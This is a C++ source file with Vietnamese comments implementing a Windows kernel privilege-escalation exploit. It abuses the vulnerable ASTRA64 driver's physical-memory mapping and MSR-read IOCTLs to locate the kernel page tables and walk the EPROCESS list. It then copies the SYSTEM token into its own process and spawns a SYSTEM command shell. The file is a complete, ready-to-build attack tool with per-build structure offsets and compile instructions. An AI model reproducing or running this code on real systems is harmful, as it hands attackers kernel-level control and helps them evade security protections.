/*
 * 1_token_swap.cpp — DKOM: ghi trực tiếp token SYSTEM vào EPROCESS của tiến trình hiện tại
 *
 * Ý tưởng:
 *   Mỗi process có _EPROCESS.Token trỏ đến đối tượng _TOKEN.
 *   Process System (PID 4) có token đặc quyền SYSTEM.
 *   Ta dùng driver đọc/ghi physical memory để copy token đó vào EPROCESS của mình.
 *   Không có race condition, không patch kernel code.
 *
 * Bước:
 *   1. Mở ASTRA64 device
 *   2. Đọc LSTAR MSR → tìm ntoskrnl base
 *   3. Scan physical RAM → tìm CR3 (page table của system process)
 *   4. Walk EPROCESS list qua PsInitialSystemProcess export
 *   5. Đọc EPROCESS.Token của System và của mình
 *   6. Ghi token System vào EPROCESS.Token của mình
 *   7. Spawn cmd.exe → SYSTEM shell
 *   8. Restore token gốc
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:1_token_swap.exe 1_token_swap.cpp ^
 *      /link /subsystem:console kernel32.lib advapi32.lib ntdll.lib
 *
 * Chạy (Administrator):
 *   1_token_swap.exe
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// ════════════════════════════════════════════════════════════
//   ASTRA64 IOCTLs (từ LOLDrivers #294 + reverse)
// ════════════════════════════════════════════════════════════
#define IOCTL_MAP_PHYS  0x80002008u   // map 1 physical page vào user VA
#define IOCTL_READ_MSR  0x800020ECu   // đọc MSR tùy ý qua rdmsr
#define DEVICE_PATH     "\\\\.\\Astra32Device0"
#define IA32_LSTAR      0xC0000082u   // MSR chứa địa chỉ syscall handler (trong ntoskrnl)
#define KUSD_VA         0xFFFFF78000000000ULL  // KUSER_SHARED_DATA — dùng để verify CR3
#define EX_FAST_REF_MASK 0xFULL       // 4 bit thấp của EPROCESS.Token = ref count

static bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

// ════════════════════════════════════════════════════════════
//   Driver input struct cho IOCTL_MAP_PHYS
//   interface_type [out]: low 32 bit của user VA được map
//   physical_addr  [in]:  địa chỉ physical cần map
// ════════════════════════════════════════════════════════════
#pragma pack(push,1)
struct MAP_INPUT {
    uint32_t interface_type;
    uint32_t bus_number;
    uint64_t physical_addr;
    uint32_t address_space;
    uint32_t size;
};
#pragma pack(pop)

// ════════════════════════════════════════════════════════════
//   Astra — wrapper cho ASTRA64 device
// ════════════════════════════════════════════════════════════
struct Astra {
    HANDLE   dev     = INVALID_HANDLE_VALUE;
    uint64_t hint_hi = 0;  // cache upper 32 bit của mapped VA

    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE,
                          NULL, OPEN_EXISTING, 0, NULL);
        if (dev == INVALID_HANDLE_VALUE)
            printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
        return dev != INVALID_HANDLE_VALUE;
    }
    void close() {
        if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; }
    }

    bool read_msr(uint32_t idx, uint64_t *out) {
        uint8_t io[8] = {}; memcpy(io, &idx, 4); DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_READ_MSR, io, 4, io, 8, &ret, NULL)) return false;
        memcpy(out, io, 8); return true;
    }

    // Map 1 physical page. Driver chỉ trả về low 32 bit của VA,
    // ta phải tìm upper 32 bit bằng cách thử hint_hi trước, rồi scan.
    uintptr_t map_page(uint64_t phys_page) {
        MAP_INPUT inp = {}; inp.physical_addr = phys_page; inp.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS,
                             &inp, sizeof(inp), &inp, sizeof(inp), &ret, NULL)) return 0;
        uint64_t lo = (uint64_t)(uint32_t)inp.interface_type;
        if (!lo) return 0;
        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo;
            MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0
                    && mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
        };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) {
            if (hi == hint_hi) continue;
            if (auto va = try_hi(hi)) { hint_hi = hi; return va; }
        }
        return 0;
    }
    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }

    // ReadProcessMemory thay vì deref trực tiếp — an toàn hơn với HVCI
    static bool safe_copy(uintptr_t src, void *dst, size_t n) {
        SIZE_T rd = 0;
        return ReadProcessMemory(GetCurrentProcess(), (LPCVOID)src, dst, n, &rd) && rd == n;
    }

    bool read_phys(uint64_t addr, void *buf, size_t len) {
        auto *dst = (uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page  = addr & ~(uint64_t)0xFFF;
            size_t   off   = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page); if (!va) return false;
            bool ok = safe_copy(va + off, dst + pos, chunk);
            unmap(va); if (!ok) return false;
            pos += chunk; addr += chunk;
        }
        return true;
    }
    bool write_phys(uint64_t addr, const void *buf, size_t len) {
        auto *src = (const uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page  = addr & ~(uint64_t)0xFFF;
            size_t   off   = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page); if (!va) return false;
            memcpy((void *)(va + off), src + pos, chunk);
            unmap(va); pos += chunk; addr += chunk;
        }
        return true;
    }
    bool read_u32(uint64_t pa, uint32_t *v) { return read_phys(pa, v, 4); }
    bool read_u64(uint64_t pa, uint64_t *v) { return read_phys(pa, v, 8); }
    bool write_u64(uint64_t pa, uint64_t v) { return write_phys(pa, &v, 8); }
};

// ════════════════════════════════════════════════════════════
//   Page table walk 4 cấp: CR3 → PML4 → PDPT → PD → PT → PA
// ════════════════════════════════════════════════════════════
static bool virt_to_phys(Astra *d, uint64_t cr3, uint64_t va, uint64_t *pa) {
    auto idx = [&](int lvl) { return (va >> (12 + lvl*9)) & 0x1FF; };
    uint64_t e = 0;
    if (!d->read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3)*8, &e) || !(e&1)) return false;
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(2)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return true; } // 1GB page
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(1)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL); return true; }  // 2MB page
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(0)*8, &e) || !(e&1)) return false;
    *pa = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
    return true;
}

static bool vread(Astra *d, uint64_t cr3, uint64_t va, void *buf, size_t len) {
    auto *dst = (uint8_t *)buf;
    for (size_t pos = 0; pos < len; ) {
        size_t off = (size_t)(va & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
        uint64_t pa; if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst+pos, chunk)) return false;
        pos += chunk; va += chunk;
    }
    return true;
}
static bool vread_u64(Astra *d, uint64_t cr3, uint64_t va, uint64_t *v) { return vread(d,cr3,va,v,8); }

// ════════════════════════════════════════════════════════════
//   Tìm CR3 của system process
//   Scan từng page trong low 64 MB physical RAM,
//   kiểm tra PML4 entry tại index 0x1EF (KUSD), rồi verify.
// ════════════════════════════════════════════════════════════
static uint64_t find_cr3(Astra *d) {
    const uint64_t idx = (KUSD_VA >> 39) & 0x1FF;  // = 0x1EF
    printf("[*] Scanning low 64 MB for CR3...\n");
    std::vector<uint64_t> cands;
    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0;
        if (!d->read_u64(pg + idx*8, &e) || !(e&1)) continue;
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue;
        cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    // Verify: translate KUSD_VA và đọc NtMajorVersion (+0x26C) == 10
    for (uint64_t cr3 : cands) {
        uint64_t pa; uint32_t v = 0;
        if (virt_to_phys(d, cr3, KUSD_VA, &pa) && d->read_u32(pa + 0x26C, &v) && v == 10)
            return cr3;
    }
    return 0;
}

// ════════════════════════════════════════════════════════════
//   Tìm ntoskrnl base qua NtQuerySystemInformation(11)
//   Nhanh hơn nhiều so với walk ngược từ LSTAR (~1000 lần đọc physical).
// ════════════════════════════════════════════════════════════
typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
struct RTL_MOD { PVOID Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize, Flags; USHORT LoadOrderIdx,InitOrderIdx,LoadCount,NameOffset; CHAR FullName[256]; };
struct RTL_MODS { ULONG Count; RTL_MOD Mods[1]; };

static uint64_t get_nt_kbase() {
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG sz = 0x20000; RTL_MODS *buf = NULL; NTSTATUS st;
    do { free(buf); buf = (RTL_MODS *)malloc(sz); if (!buf) return 0;
         st = NtQSI(11, buf, sz, &sz);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(buf); return 0; }
    uint64_t base = 0;
    for (ULONG i = 0; i < buf->Count; i++) {
        const char *fn = buf->Mods[i].FullName + buf->Mods[i].NameOffset;
        if (_stricmp(fn, "ntoskrnl.exe") == 0) { base = (uint64_t)(uintptr_t)buf->Mods[i].ImageBase; break; }
    }
    free(buf); return base;
}

static uintptr_t load_image(const char *name) {
    return (uintptr_t)LoadLibraryExA(name, NULL, DONT_RESOLVE_DLL_REFERENCES);
}
static uint64_t export_rva(uintptr_t base, const char *name) {
    FARPROC p = GetProcAddress((HMODULE)base, name);
    return p ? (uint64_t)((uintptr_t)p - base) : 0;
}

// ════════════════════════════════════════════════════════════
//   EPROCESS offsets — khác nhau theo Windows build
// ════════════════════════════════════════════════════════════
struct EpOff { uint64_t pid, links, token; };

static EpOff detect_ep_offsets() {
    typedef NTSTATUS(NTAPI *fn)(PRTL_OSVERSIONINFOW);
    auto f = (fn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    RTL_OSVERSIONINFOW ov = {}; ov.dwOSVersionInfoSize = sizeof(ov); if (f) f(&ov);
    printf("[*] Build: %lu\n", ov.dwBuildNumber);
    if (ov.dwBuildNumber >= 26100) return {0x1D0, 0x1D8, 0x248}; // Win11 24H2+
    return                         {0x440, 0x448, 0x4B8};        // Win10 / Win11 <24H2
}

// ════════════════════════════════════════════════════════════
//   Walk EPROCESS list từ PsInitialSystemProcess (System PID 4)
//   qua ActiveProcessLinks để tìm EPROCESS của target PID.
// ════════════════════════════════════════════════════════════
static bool find_eprocess(Astra *d, uint64_t cr3,
                           uint64_t nt_kbase, uintptr_t nt_disk,
                           const EpOff &ep, uint32_t tgt_pid,
                           uint64_t *sys_ep, uint64_t *tgt_ep) {
    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess");
    if (!rva) { printf("[-] PsInitialSystemProcess not found\n"); return false; }
    uint64_t se = 0;
    if (!vread_u64(d, cr3, nt_kbase + rva, &se) || !is_kptr(se)) {
        printf("[-] *PsInitialSystemProcess invalid\n"); return false;
    }
    uint64_t spid = 0; vread_u64(d, cr3, se + ep.pid, &spid);
    if (spid != 4) { printf("[-] Unexpected System PID=%llu\n", (unsigned long long)spid); return false; }
    *sys_ep = se;
    if (tgt_pid == 4) { *tgt_ep = se; return true; }

    // Walk Flink chain
    uint64_t head = 0, flink = 0;
    if (!vread_u64(d, cr3, se + ep.links + 8, &head) || !is_kptr(head)) return false;
    if (!vread_u64(d, cr3, head, &flink)) return false;
    for (int i = 0; i < 4096 && flink != head; i++) {
        uint64_t ep_va = flink - ep.links, pid = 0;
        if (vread_u64(d, cr3, ep_va + ep.pid, &pid) && (uint32_t)pid == tgt_pid)
            { *tgt_ep = ep_va; return true; }
        uint64_t nxt = 0;
        if (!vread_u64(d, cr3, flink, &nxt) || !is_kptr(nxt)) break;
        flink = nxt;
    }
    printf("[-] PID %u not found in EPROCESS list\n", tgt_pid); return false;
}

// ════════════════════════════════════════════════════════════
//   main
// ════════════════════════════════════════════════════════════
int main() {
    printf("\n=== Technique 1: DKOM Token Swap ===\n\n");

    Astra drv;
    if (!drv.open()) return 1;
    printf("[+] ASTRA64 device opened\n");

    // Bước 1: tìm CR3
    uint64_t cr3 = find_cr3(&drv);
    if (!cr3) { printf("[-] CR3 not found\n"); return 1; }
    printf("[+] CR3   = 0x%llX\n", (unsigned long long)cr3);

    // Bước 2: tìm ntoskrnl base qua NtQSI (instant, không cần walk virtual memory)
    uint64_t nt_kbase = get_nt_kbase();
    if (!nt_kbase) { printf("[-] ntoskrnl not found via NtQSI\n"); return 1; }
    printf("[+] ntoskrnl = 0x%llX\n", (unsigned long long)nt_kbase);

    // Bước 4: load disk image để resolve export
    uintptr_t nt_disk = load_image("ntoskrnl.exe");
    if (!nt_disk) { printf("[-] LoadLibraryEx ntoskrnl.exe failed\n"); return 1; }

    EpOff ep = detect_ep_offsets();
    printf("[*] EPROCESS offsets: pid=+0x%llX links=+0x%llX token=+0x%llX\n",
           (unsigned long long)ep.pid, (unsigned long long)ep.links, (unsigned long long)ep.token);

    // Bước 5: walk EPROCESS list
    uint32_t my_pid = GetCurrentProcessId();
    printf("[*] Walking EPROCESS (PID 4 + %u)...\n", my_pid);
    uint64_t sys_ep = 0, my_ep = 0;
    if (!find_eprocess(&drv, cr3, nt_kbase, nt_disk, ep, my_pid, &sys_ep, &my_ep)) return 1;
    printf("[+] System EPROCESS = 0x%llX\n", (unsigned long long)sys_ep);
    printf("[+] Our    EPROCESS = 0x%llX\n", (unsigned long long)my_ep);

    // Bước 6: lấy physical address của Token field trong cả hai EPROCESS
    uint64_t pa_sys_tok = 0, pa_my_tok = 0;
    if (!virt_to_phys(&drv, cr3, sys_ep + ep.token, &pa_sys_tok) ||
        !virt_to_phys(&drv, cr3, my_ep  + ep.token, &pa_my_tok)) {
        printf("[-] Cannot translate Token fields\n"); return 1;
    }

    // Bước 7: đọc cả hai token
    uint64_t sys_tok = 0, orig_tok = 0;
    drv.read_u64(pa_sys_tok, &sys_tok);
    drv.read_u64(pa_my_tok,  &orig_tok);
    printf("[+] System token = 0x%llX\n", (unsigned long long)sys_tok);
    printf("[+] Our    token = 0x%llX\n", (unsigned long long)orig_tok);

    // Bước 8: ghi token System vào EPROCESS.Token của mình
    printf("[*] Writing System token into our EPROCESS.Token...\n");
    drv.write_u64(pa_my_tok, sys_tok);

    // Verify bằng cách kiểm tra elevation
    BOOL elevated = FALSE;
    HANDLE htok;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htok)) {
        TOKEN_ELEVATION te; DWORD sz = sizeof(te);
        GetTokenInformation(htok, TokenElevation, &te, sz, &sz);
        elevated = te.TokenIsElevated; CloseHandle(htok);
    }
    if (!elevated) { printf("[-] Token swap did not elevate\n"); return 1; }
    printf("[+] ELEVATED! Spawning SYSTEM shell...\n\n");

    // Bước 9: spawn cmd.exe — nó kế thừa token SYSTEM của ta
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    char cmd[] = "cmd.exe";
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[+] cmd.exe spawned (PID %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess: %lu\n", GetLastError());
    }

    // Bước 10: restore token gốc sau khi shell đã launch
    Sleep(2000);
    printf("[*] Restoring original token...\n");
    // Mở lại device vì sau swap token có thể handle bị ảnh hưởng
    Astra drv2; drv2.open();
    uint64_t pa2 = 0;
    if (virt_to_phys(&drv2, cr3, my_ep + ep.token, &pa2))
        drv2.write_u64(pa2, orig_tok);
    drv2.close();
    printf("[+] Token restored.\n");

    drv.close();
    return 0;
}
